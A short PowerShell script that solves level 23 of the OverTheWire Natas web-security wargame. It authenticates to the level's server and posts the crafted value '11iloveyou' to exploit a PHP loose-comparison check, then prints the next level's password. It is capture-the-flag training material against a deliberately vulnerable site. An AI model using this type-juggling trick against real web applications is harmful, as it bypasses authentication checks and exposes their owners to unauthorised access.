$Init = 22
$Username = 'natas' + ($Init + 1)
$Password = Get-Content -Path ../../../etc/otw/natas.pass | Select-Object -Skip $Init | Select-Object -First 1
$Creds = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes("$($Username):$($Password)"))
$Uri = "http://$Username.natas.labs.overthewire.org/"
$Session = New-Object Microsoft.PowerShell.Commands.WebRequestSession

$Request = @{
	Uri = $Uri
	Method = 'POST'
	WebSession = $Session
	Headers = @{ Authorization = "Basic $Creds" }
	Body = @{
		passwd = '11iloveyou'
	}
}

$Res = Invoke-WebRequest @Request | Select-Object -ExpandProperty Content

$Natas24 = ($Res | Select-String -Pattern "Password:\s*(\w+)").Matches.Value
Write-Host -ForegroundColor Green $Natas24